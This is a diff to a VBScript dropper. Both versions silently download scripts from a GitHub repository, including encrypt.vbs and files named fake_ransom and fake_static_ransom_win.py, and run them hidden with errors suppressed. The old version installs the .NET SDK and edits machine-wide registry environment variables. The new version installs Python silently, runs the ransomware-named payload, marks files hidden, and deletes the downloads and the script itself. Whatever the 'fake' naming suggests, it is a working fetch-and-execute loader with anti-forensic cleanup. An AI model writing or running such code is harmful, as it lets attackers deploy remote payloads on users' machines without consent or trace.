@@ -1,151 +1,83 @@
-' Suppress all error popups
+' Suppress all error popups (script will run silently in background)
 On Error Resume Next
 
-Dim objShell, fso, tempDir, configDir, dotnetPath, installerScript
-Dim downloadCmd, installCmd, runCmd, args, dotnetExe
-Dim lalaUrl, lalaPath, url1, url2, path1, path2, fObj
+Dim objShell, fso, tempDir, configDir, pythonInstaller, pythonPath, pythonExe
+Dim downloadCmd, installCmd, runCmd, folderObj
+
+' ---- File names (change these to whatever names you want) ----
+Dim filename1, filename2, filename3
+filename1 = "fake_static_ransom_win.py"   ' downloaded from url1
+filename2 = "auto.py"     ' downloaded from url2
+filename3 = "encrypt.vbs"    ' downloaded from url3, runs first with cscript
 
 Set objShell = CreateObject("WScript.Shell")
-Set fso      = CreateObject("Scripting.FileSystemObject")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
 If objShell Is Nothing Or fso Is Nothing Then WScript.Quit
 
-' Non-admin, non-profile temp dir.
-' C:\ProgramData allows standard users to create subfolders (CREATOR OWNER
-' gets Full Control on the created folder), so no elevation is needed.
-tempDir = "C:\ProgramData\.apptemp"
+' Define paths (using Windows temp instead of user temp)
+tempDir = objShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
+configDir = tempDir & "\.config"
+pythonInstaller = tempDir & "\python-installer.exe"
+' Default user-level installation path for Python 3.12
+pythonPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312"
+pythonExe = pythonPath & "\python.exe"
 
-' curl -o and CreateObject do NOT create parent folders — create it first
-If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)
-configDir       = "C:\ProgramData\.dotnet"
-dotnetPath      = "C:\ProgramData\.dotnet"
-installerScript = tempDir & "\dotnet-install.ps1"
+' 1. Create hidden directory
+If Not fso.FolderExists(configDir) Then
+    fso.CreateFolder(configDir)
+End If
+Set folderObj = fso.GetFolder(configDir)
+folderObj.Attributes = folderObj.Attributes Or 2 ' 2 = Hidden
 
-' ---- BUG FIX #2: make sure install dir exists ------------------
-If Not fso.FolderExists(configDir) Then fso.CreateFolder(configDir)
+' 2. Download lala.vbs, run it with cscript, then permanently delete it
+Dim url3, path3
+url3 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/encrypt.vbs"
+path3 = configDir & "\" & filename3
 
-' =========================================================
-' STEP 0 — download and run encrypt.vbs FIRST (blocking)
-' =========================================================
-lalaUrl  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/encrypt.vbs"
-lalaPath = configDir & "\encrypt.vbs"
+objShell.Run "cmd /c curl -sL -o """ & path3 & """ """ & url3 & """", 0, True
+objShell.Run "cmd /c cd /d """ & configDir & """ && cscript //nologo """ & filename3 & """", 0, True
+If fso.FileExists(path3) Then fso.DeleteFile path3, True
 
-objShell.Run "cmd /c curl -sL -o """ & lalaPath & """ """ & lalaUrl & """", 0, True
+' 3. Check if Python is already installed, if not, download and install silently
+If Not fso.FileExists(pythonExe) Then
+    ' Download Python 3.12.2 official installer
+    downloadCmd = "cmd /c curl -sL -o """ & pythonInstaller & """ https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
+    objShell.Run downloadCmd, 0, True
 
-If fso.FileExists(lalaPath) Then
-    objShell.CurrentDirectory = configDir
-    objShell.Run "cscript.exe //nologo """ & lalaPath & """", 0, True   ' blocks until done
-
-    ' encrypt.vbs has finished running — delete it now
-    fso.DeleteFile lalaPath, True
+    ' Install Python silently for current user (No UAC prompt, no window)
+    ' InstallAllUsers=0 ensures it installs in %LOCALAPPDATA% and requires no admin rights
+    installCmd = "cmd /c """ & pythonInstaller & """ /quiet InstallAllUsers=0 PrependPath=1 Include_test=0"
+    objShell.Run installCmd, 0, True
+    
+    ' Clean up the installer
+    fso.DeleteFile pythonInstaller, True
 End If
 
-' =========================================================
-' STEP 1 — download official dotnet-install.ps1
-' =========================================================
-downloadCmd = "cmd /c curl -sL -o """ & installerScript & """ https://dot.net/v1/dotnet-install.ps1"
-objShell.Run downloadCmd, 0, True
-
-If Not fso.FileExists(installerScript) Then WScript.Quit
-
-' =========================================================
-' STEP 2 — install .NET 10 SDK to C:\ProgramData\.dotnet
-' =========================================================
-installCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File """ & installerScript & """ -Channel 10.0 -InstallDir """ & dotnetPath & """"
-objShell.Run installCmd, 0, True
-
-dotnetExe = dotnetPath & "\dotnet.exe"
-
-' ---- BUG FIX #3: bail out if install failed silently -----------
-If Not fso.FileExists(dotnetExe) Then WScript.Quit
-
-' =========================================================
-' STEP 3 — set environment variables (machine-wide / GLOBAL)
-' =========================================================
-SetSystemEnv "DOTNET_ROOT", dotnetPath
-AppendToSystemPath dotnetPath
-
-' ---- BUG FIX #5: broadcast change for DOTNET_ROOT --------------
-' setx /M writes AND broadcasts WM_SETTINGCHANGE. Only use it for
-' DOTNET_ROOT (short value, no 1024-char truncation risk).
-objShell.Run "cmd /c setx DOTNET_ROOT """ & dotnetPath & """ /M >nul 2>&1", 0, True
-
-' =========================================================
-' STEP 4 — download auto.cs and fake_ransom.cs from GitHub
-' =========================================================
-url1  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs"
-url2  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/fake_ransom.cs"
-path1 = configDir & "\auto.cs"
-path2 = configDir & "\fake_ransom.cs"
+' 4. Download the Python files
+Dim url1, url2, path1, path2
+url1 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/fake_static_ransom_win.py"
+url2 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py"
+path1 = configDir & "\" & filename1
+path2 = configDir & "\" & filename2
 
 objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
 objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True
 
-' ---- BUG FIX #1: OR with existing attributes, not "= 2" --------
-If fso.FileExists(path1) Then
-    Set fObj = fso.GetFile(path1)
-    fObj.Attributes = fObj.Attributes Or 2
-End If
-If fso.FileExists(path2) Then
-    Set fObj = fso.GetFile(path2)
-    fObj.Attributes = fObj.Attributes Or 2
-End If
+' Apply Hidden attribute to the downloaded files
+If fso.FileExists(path1) Then fso.GetFile(path1).Attributes = 2
+If fso.FileExists(path2) Then fso.GetFile(path2).Attributes = 2
 
-' ---- BUG FIX #4: don't run if either file is missing -----------
-If Not fso.FileExists(path1) Then WScript.Quit
-If Not fso.FileExists(path2) Then WScript.Quit
+' 5. Execute Python silently
+' Run python.exe with the args, setting the working directory to configDir
+Dim args
+args = filename2 & " " & filename1 
+runCmd = "cmd /c cd /d """ & configDir & """ && """ & pythonExe & """ " & args
+objShell.Run runCmd, 0, False
 
-
-' =========================================================
-' STEP 5 — run C# files as-is, then clean up
-' =========================================================
-args   = "run --file auto.cs -- fake_ransom.cs"
-runCmd = "cmd /c cd /d """ & configDir & """ && """ & dotnetExe & """ " & args
-
-' True = wait until dotnet.exe exits
-objShell.Run runCmd, 0, True
-
-' Remove ONLY the two .cs files — SDK stays intact
-If fso.FileExists(path1) Then fso.DeleteFile path1, True   ' True = force (handles Hidden/ReadOnly)
+' 6. After everything has finished, permanently delete the downloaded files and this script
+WScript.Sleep 5000 ' give Python a moment to load the .py files
+If fso.FileExists(path1) Then fso.DeleteFile path1, True
 If fso.FileExists(path2) Then fso.DeleteFile path2, True
-
-
-' =========================================================
-' STEP 6 — remove the temp folder entirely
-' =========================================================
-' lala.vbs was already deleted right after it ran (Step 0).
-' dotnet-install.ps1 is still there — remove it first, then the folder.
-If fso.FileExists(installerScript) Then fso.DeleteFile installerScript, True
-If fso.FolderExists(tempDir)       Then fso.DeleteFolder tempDir, True
-
-' ---------------------------------------------------------
-' Helpers (machine-wide / global env vars)
-' ---------------------------------------------------------
-Sub SetSystemEnv(varName, varValue)
-    objShell.RegWrite _
-        "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" & varName, _
-        varValue, "REG_EXPAND_SZ"
-End Sub
-
-Sub AppendToSystemPath(newPath)
-    Dim regPath, currentPath, paths, p, found
-    regPath     = "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path"
-    currentPath = objShell.RegRead(regPath)
-
-    If currentPath = "" Then
-        objShell.RegWrite regPath, newPath, "REG_EXPAND_SZ"
-        Exit Sub
-    End If
-
-    found = False
-    ' ---- BUG FIX #7: compare with trailing ";" trimmed -----------
-    For Each p In Split(currentPath, ";")
-        If LCase(Trim(p)) = LCase(newPath) Then
-            found = True
-            Exit For
-        End If
-    Next
-
-    If Not found Then
-        objShell.RegWrite regPath, newPath & ";" & currentPath, "REG_EXPAND_SZ"
-    End If
-End Sub
+' Permanently delete this script itself (delayed, so the file is no longer locked)
+objShell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & WScript.ScriptFullName & """", 0, False
